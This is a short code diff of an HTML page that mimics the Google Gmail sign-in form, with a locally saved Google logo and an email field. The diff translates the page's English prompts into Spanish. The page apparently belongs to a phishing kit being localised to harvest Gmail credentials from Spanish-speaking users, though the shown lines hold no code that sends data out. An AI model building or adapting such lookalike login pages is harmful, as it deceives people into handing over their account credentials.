@@ -239,21 +239,21 @@ attach_ezolpl();
             <img src="./index_files/google_PNG19644.png" alt="logo">
         </div>
         <div class="form-greeting">
-            <span>Sign in</span>
+            <span>Iniciar sesión</span>
         </div>
 
          <div class="form-greetings">
-            <span>to continue to Gmail</span>
+            <span>Continuar con gmail</span>
         </div>
 
        
         <div class="field-wrapper">
         <input type="email" name="email" id"" >
-            <div class="field-placeholder"><span>Email or Phone</span></div>
+            <div class="field-placeholder"><span>Gmail o Número</span></div>
         </div>
         
         
-        <h8 style="color:#1a73e8;" "font-weight:500"><b>Forgot email?</b></h8>
+        <h8 style="color:#1a73e8;" "font-weight:500"><b>Perdio su email?</b></h8>
      
         <br>
         <br>
